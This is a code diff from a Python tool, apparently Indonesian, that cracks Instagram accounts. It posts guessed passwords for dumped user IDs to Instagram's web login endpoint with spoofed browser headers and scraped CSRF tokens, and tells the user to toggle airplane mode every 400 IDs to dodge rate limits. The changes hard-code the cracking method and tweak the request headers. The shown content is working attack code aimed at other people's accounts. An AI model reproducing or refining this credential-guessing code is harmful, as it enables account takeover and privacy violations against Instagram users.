@@ -140,7 +140,7 @@ class main(requests.Session):
 		while self.methods not in list("12"):
 			self.methods = input(" [?] method: ")
 		print("\n [*] on/off modpes setiap 400 id\n [*] running...\n")
-		crack().start(set_password(self.result, ml=True if self.ask == "Y" else False), "ajax" if self.methods == "2" else "M3M3K")
+		crack().start(set_password(self.result, ml=True if self.ask == "Y" else False), "MEMEKS") #"ajax" if self.methods == "2" else "M3M3K")
 		
 class dump(main):
 
@@ -292,7 +292,7 @@ class crack():
 				self.ajax = re.search('"__spin_r":(.*?),', self.res.text)
 				self.ajax = self.ajax.group(1) if self.ajax else "1007229429"
 				self.token = re.search(r'\\"csrf_token\\":\\"(.*?)\\"', self.res.text).group(1)
-				self.ses.headers.update({"host": "www.instagram.com", "accept": "*/*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "content-type": "application/x-www-form-urlencoded", "origin": "https://www.instagram.com", "referer": "https://www.instagram.com/accounts/login/", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "user-agent": self.huuh.ua, "x-asbd-id": "198387", "x-ig-app-id": "936619743392459", "x-ig-www-claim": "0", "x-instagram-ajax": self.ajax, "x-requested-with": "XMLHttpRequest", "x-web-device-id": str(uuid.uuid4()).upper(), "x-csrftoken": self.token})
+				self.ses.headers.update({"host": "www.instagram.com", "accept": "*/*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "content-type": "application/x-www-form-urlencoded", "origin": "https://www.instagram.com", "referer": "https://www.instagram.com/", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "user-agent": self.huuh.ua, "x-asbd-id": "198387", "x-ig-app-id": "936619743392459", "x-ig-www-claim": "0", "x-instagram-ajax": self.ajax, "x-requested-with": "XMLHttpRequest", "x-csrftoken": self.token})
 				self.data = {"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}", "username": username, "queryParams": "{}", "optIntoOneTap": "false", "trustedDeviceRecords": "{}"}
 				self.res = self.ses.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", data=self.data, allow_redirects=False)
 				if "userId" in self.res.text:
